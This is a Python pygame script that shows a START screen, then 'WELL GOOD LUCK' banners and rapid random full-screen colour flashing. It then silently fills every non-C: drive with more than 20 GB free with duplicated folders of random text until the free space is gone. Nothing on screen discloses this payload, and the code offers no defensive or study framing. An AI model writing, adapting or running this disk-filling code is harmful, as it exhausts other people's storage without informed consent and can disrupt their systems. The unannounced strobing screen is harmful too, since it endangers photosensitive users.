import pygame
# import time
import os
import shutil
import random
import string

#pygame globals
# limit=True
limit=False
path = ''
ground='THE IRON GRAVE'
space='DARKNIGHT'
folna='LORD'
filna='PRITHWISH'
slel='SECTOR'

a=list(string.printable)
a=a[0:len(a)-2]
a.extend(list('\n '*5))
random.shuffle(a)
atext=''


tm=100      #text maker 100
fol=100     #no of folder 100
fil=50      #no of files 50
mul=100    #no of times text is writen 100


    
def setup():
    global win,frame,go,gopo,warn,limtpo,  font2
    pygame.init()
    win=pygame.display.set_mode((1600,1000))
    frame= pygame.time.Clock()

    font = pygame.font.Font('freesansbold.ttf',250)
    go=font.render(" : START : ",True,(255,130,10))
    gopo=go.get_rect(center=(800,500))
    # print(gopo)
    font2 = pygame.font.Font('freesansbold.ttf',25)
    warn=[]
    p=250
    for i in ('-: WELL :-','-: GOOD :-','-: LUCK :-') :
        te=font.render(i,True,(0,0,0))
        telo=te.get_rect(center=(800,p))
        p+=250
        warn.append([te,telo])
    looper()
def looper() :
    global limit
    cli=False
    wait=50
    # wait=700
    run=True
    col=True
    inr=False
    she=0
    click=True
    # ac,bc,cc=10,10,10
    # acv,bcv,ccv=1,1,1
    ru=font2.render(" RUN",True,(55,190,255))    
    rupo=ru.get_rect(topleft=(115, 115))
    lim=font2.render(" LIMIT ",True,(0,0,0))
    limpo=lim.get_rect(topleft=(115, 115))

    while True :
        # print(pygame.mouse.get_pos())        
        frame.tick(50)
        for eve in pygame.event.get() :
            if eve.type == pygame.QUIT :
                pygame.quit()
                exit(10)
        
            if eve.type == pygame.KEYDOWN :
                # obsticle(random.randint(20,WI))
                if eve.key == pygame.K_r :
                    inr=True
                elif eve.key == pygame.K_SPACE and inr :
                    pygame.quit()
                    exit(10)
                else :
                    inr=False
            if eve.type == pygame.MOUSEBUTTONUP :
                # obsticle(random.randint(20,WI))
                if eve.button == 3 :
                    click=True
        if run :  
            win.fill((0,0,0))
                  
            if gopo.collidepoint(pygame.mouse.get_pos()) :
                a=(199,255,255)
                if pygame.mouse.get_pressed()[0] and col :
                    a=(255,255,0)
                    if not cli:                    
                        cli=True
            else :
                a=(30,35,255)
            pygame.draw.rect(win,a,gopo)        
            win.blit(go,gopo)
            if  limit :
                
                if rupo.collidepoint(pygame.mouse.get_pos()) :
                    pygame.draw.rect(win,(50,50,255),rupo)        
                    if pygame.mouse.get_pressed()[0] :                  
                        limit=False
                        
                    if pygame.mouse.get_pressed()[2] and click :                  
                        limit=False
                        click=False
                win.blit(ru,rupo)
            if not limit :
                
                if limpo.collidepoint(pygame.mouse.get_pos()) :
                    pygame.draw.rect(win,(100,100,255),limpo)        
                    if pygame.mouse.get_pressed()[2] and click :                  
                        limit=True   
                        click=False                     
                win.blit(lim,limpo)
        pygame.display.update()
        if cli :
            wait-=1
            if wait == 690 :
                col=False
            if wait==650 :
                run=False
                win.fill((255,10,10))
            if wait==610 :
                win.blit(warn[0][0],warn[0][1])
            if wait==540 :
                win.blit(warn[1][0],warn[1][1])
            if wait==500 :
                win.blit(warn[2][0],warn[2][1])
            if wait==450 :
                pygame.mouse.set_visible(False)
                win.fill((0,0,0))
            if wait < 400 :
                she=random.randint(1,5)
                match(she):
                    case 1 : col=0,0,0
                    case 2 : col=25,25,25
                    case 3 : col=0,0,255
                    case 4 : col=0,255,0
                    case 5 : col=255,0,0
                    case 6 : col=255,0,255
                    case 7 : col=255,255,0
                    case 7 : col=0,255,255
                    
                    
                win.fill(col)
                # she+=1;she%=4
                she=random.randint(1,5)
                
            if wait == 0 :
                pygame.quit()
                runer()
                break

def finish():
    # global win,frame,go,gopo,warn
    pygame.init()
    win=pygame.display.set_mode((1200,700))
    frame= pygame.time.Clock()

    font = pygame.font.Font('freesansbold.ttf',300)
    go=font.render("DONE",True,(220,220,255))
    gopo=go.get_rect(center=(600,330))
    a=0
    win.blit(go,gopo)
    inc=True
    while True :
        frame.tick(60)
        for eve in pygame.event.get() :
            if eve.type == pygame.QUIT :
                pygame.quit()
                exit(10)
        
            if eve.type == pygame.KEYDOWN :
                if eve.key == pygame.K_r :
                    pygame.quit()
                    exit(10)
        # a+=1
        # a%=200
        if inc :
            a+=1 
            if a>100 :inc=False
        else :
            a-=1 
            if a<1 :inc=True
        
        win.fill((a,a,a+20))
        win.blit(go,gopo)
        pygame.display.update()

def drisel() :
    ini=list(string.ascii_uppercase)
    ini.remove('C')
    disks=[]
    for i in ini :
        
        try :
            b=shutil.disk_usage(f'{i}:')
            # print(b)
            if b[2]//2**30 >20 :
                # disks.append((i,(b[0]//2**30,b[1]//2**30,b[2]//2**30)))
                disks.append(i)
                
        except FileNotFoundError : pass
    if limit :
        return(['H'])    
    return(disks)

def place() :
    global path
    
    if not os.path.exists(path):
        os.mkdir(path)
    path+=f'\\{space}'
    
    num=0
    while os.path.exists(f'{path}-{num}'):
        # shutil.rmtree(path)
        num+=1
    os.mkdir(f'{path}-{num}')
    path+=f'-{num}\\{slel}'
    # print(path)
    os.mkdir(path)

def text_maker() :
    global atext    
    for _ in range(tm**2):
        atext+=str(random.choice(a))    

def create() :
    os.mkdir(f'{path}\\{folna}')

    
    with open(f'{path}\\{folna}\\{filna}.txt', 'w') as fi:
        # text_maker()
        fi.write(atext*mul)
    filedupe()    

def filedupe() :
    for i in range(fil) :
        shutil.copy(f'{path}\\{folna}\\{filna}.txt',f'{path}\\{folna}\\{filna} {i}.txt')

def dupe() :
    for i in range(fol) :
        shutil.copytree(f'{path}//{folna}',f'{path}//{folna} {i}')

def calculate(x) :
    a=os.path.getsize(f'{path}\\{folna}\\{filna}.txt')*(fil+1)*(fol+1)
    a=a+a*.095
    b=shutil.disk_usage(f'{x}:')[2]
    return int(b//a)

def fillup(x) :
    print(x)
    if limit :
        print(x)
        if x>1 : x=1
    
    print()    
    
    for i in range(x) :
        shutil.copytree(path,f'{path}@{i}')
        # print(i)

def runer() :
    global path
    text_maker()
    for i in drisel() :
        # print(i)
        path=f'{i}://{ground}'
        place()
        create()
        dupe()
        fillup(calculate(i))
    
        
setup()
finish()